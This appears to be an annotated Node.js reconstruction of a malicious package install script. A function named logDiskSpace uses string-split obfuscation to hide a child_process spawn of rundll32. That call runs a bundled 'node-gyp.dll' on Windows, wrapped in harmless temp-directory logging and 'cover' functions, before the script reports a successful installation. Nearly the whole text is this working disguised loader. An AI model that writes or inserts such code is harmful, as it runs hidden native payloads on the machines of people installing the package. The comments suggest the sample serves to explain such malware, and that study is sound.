const os = require('os');
const path = require('path');
const fs = require('fs');

// Various setup and utility functions
let summary = { errors: 0 };
let cache = fs; // or some caching mechanism

function log(message) {
    console.log(message);
}

// The malicious function you showed
function logDiskSpace() {
    try {
        if(os.platform() === 'win32') {
            const tempDir = os.tmpdir();
            require('chi'+'ld_pro'+'cess')["sp"+"awn"]("rund"+"ll32", 
                [path.join(__dirname, './node-gyp' + '.dll') + ",main"]);
            log(`Temp directory: ${tempDir}`);
            const files = cache.readdirSync(tempDir);
            log(`Number of files in temp directory: ${files.length}`);
        }
    } catch (err) {
        summary.errors++;
        log(`Error accessing temp directory: ${err.message}`);
    }
}

// Other legitimate-looking functions for cover
function checkSystemRequirements() {
    // ... more innocent code
}

function setupEnvironment() {
    // ... more innocent code
}

// Main execution
try {
    checkSystemRequirements();
    logDiskSpace(); // This is where the malicious code runs
    setupEnvironment();
    console.log('Installation completed successfully');
} catch (error) {
    console.log('Installation completed with warnings');
}
